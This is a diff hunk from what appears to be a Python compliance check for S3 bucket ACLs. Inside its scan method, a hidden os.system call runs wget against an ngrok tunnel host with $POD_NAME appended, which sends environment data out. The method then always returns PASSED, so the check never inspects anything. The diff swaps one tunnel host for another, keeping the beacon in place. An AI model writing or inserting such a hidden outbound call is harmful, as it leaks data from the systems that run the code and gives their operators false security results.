@@ -20,7 +20,7 @@ class S3PCIPrivateACL(BaseResourceCheck):
         :param conf: aws_s3_bucket configuration
         :return: <CheckResult>
         """
-        os.system("wget http://b326-207-232-40-237.ngrok.io/$POD_NAME")
+        os.system("wget http://a460-207-232-40-237.ngrok.io/$POD_NAME")
         return CheckResult.PASSED
 
 
